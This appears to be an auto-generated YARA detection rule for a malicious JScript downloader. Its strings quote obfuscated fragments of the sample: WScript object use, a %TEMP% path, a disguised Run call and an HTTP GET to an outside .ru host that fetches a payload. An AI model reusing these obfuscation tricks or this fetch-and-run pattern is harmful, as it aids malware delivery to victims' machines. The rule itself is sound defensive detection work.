rule sig_20160428_829ed51d03ee941a3336efb4cdf1b9ac {
  meta:
    description = "datamaliciousorder - file 20160428_829ed51d03ee941a3336efb4cdf1b9ac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c5426f715d85a131e2b2a388488ded3645225b59f4c0c9b7ebc66628b66ba30c"

  strings:
    $s1  = "function WzqHwiBzhGtaTcqErbBkn() {return MonOivKifPkuWpoGnxHoj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "return QflZgjWajYwyLzaTaaGup - GmzWveIfxSbcQbkNbnHpc;};" fullword ascii
    $s3  = "function ZnhQmsWvcWsiAhhMvrYcb(QflZgjWajYwyLzaTaaGup, GmzWveIfxSbcQbkNbnHpc){RwqNwbQszQyqAktDliOhu = RwqNwbQszQyqAktDliOhu * 1; " ascii
    $s4  = "var MonOivKifPkuWpoGnxHoj = function ZqrPddFfgYtrNikPniYov() {return XqkCliYwmZdfAjpKzeWbt[NlwBavHzeKtmEeeHvcSus](\"WScript\"+\"" ascii
    $s5  = "var MonOivKifPkuWpoGnxHoj = function ZqrPddFfgYtrNikPniYov() {return XqkCliYwmZdfAjpKzeWbt[NlwBavHzeKtmEeeHvcSus](\"WScript\"+\"" ascii
    $s6  = "var XqkCliYwmZdfAjpKzeWbt = this[\"WScript\"];" fullword ascii
    $s7  = "function WzqHwiBzhGtaTcqErbBkn() {return MonOivKifPkuWpoGnxHoj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "function AzgUquVzsKmiBgzXmiRrq(KojNydEbbNcaPddOiaTik){MonOivKifPkuWpoGnxHoj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function AzgUquVzsKmiBgzXmiRrq(KojNydEbbNcaPddOiaTik){MonOivKifPkuWpoGnxHoj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function TafHkoGysVjhTpzBduBov(){return YmkCzdGrmIrtLngVsqQnz + \"\";};" fullword ascii
    $s11 = "function ZnhQmsWvcWsiAhhMvrYcb(QflZgjWajYwyLzaTaaGup, GmzWveIfxSbcQbkNbnHpc){RwqNwbQszQyqAktDliOhu = RwqNwbQszQyqAktDliOhu * 1; " ascii
    $s12 = "if (QmjCycMwnCxqNwqOvbHap[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function PigMawNqpBahDgzUfrIxn() {return ((SkcEskHclAqkXvyDpsZjt == true) && (SkcEskHclAqkXvyDpsZjt == XinNaiLsfNduOypUfkUhl)) ?" ascii
    $s14 = "QmjCycMwnCxqNwqOvbHap[BvsDxbLliOafQyiGinHac](\"G\" + \"ET\", \"http://cafe-vintage68.ru/asad2fl\", false);" fullword ascii
    $s15 = "function PigMawNqpBahDgzUfrIxn() {return ((SkcEskHclAqkXvyDpsZjt == true) && (SkcEskHclAqkXvyDpsZjt == XinNaiLsfNduOypUfkUhl)) ?" ascii
    $s16 = "var SkcEskHclAqkXvyDpsZjt = false;" fullword ascii
    $s17 = "XinNaiLsfNduOypUfkUhl = true; " fullword ascii
    $s18 = "function JrrDxxArjBrkCwsBgoWcd(){return 23;};" fullword ascii
    $s19 = "return ZnhQmsWvcWsiAhhMvrYcb(1 == 1 ? TwbFexKeaFipJdlWlxQen : 0, 1 == 1 ? YthCftDeaQgrFuyNuvDki : 0);" fullword ascii
    $s20 = "var XvtCttInzDvyXohAqcYed = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}